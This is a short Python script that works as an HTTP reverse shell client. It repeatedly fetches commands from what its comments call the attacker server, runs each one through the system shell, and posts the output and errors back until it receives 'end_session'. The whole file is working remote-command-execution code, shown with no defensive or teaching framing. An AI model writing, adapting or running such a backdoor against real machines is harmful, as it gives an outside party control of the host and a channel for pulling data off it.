
# importing required modules
import requests
import subprocess

HOST = "127.0.0.1"
PORT = 8080
ADDRESS = f"http://{HOST}:{PORT}"


while True:
    # send GET request to the attacker server.
    req = requests.get(ADDRESS)
    # reading commands from the attacker.
    command = req.text

    # kill the connection
    if 'end_session' in command:
        break

    else:
        # run commands throught the terminal/CMD
        command_result = subprocess.Popen(command,
                                        shell=True,
                                        stdin=subprocess.PIPE,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)

        # post output/error to the server
        requests.post(url = ADDRESS, data=command_result.stdout.read())
        requests.post(url = ADDRESS, data=command_result.stderr.read())
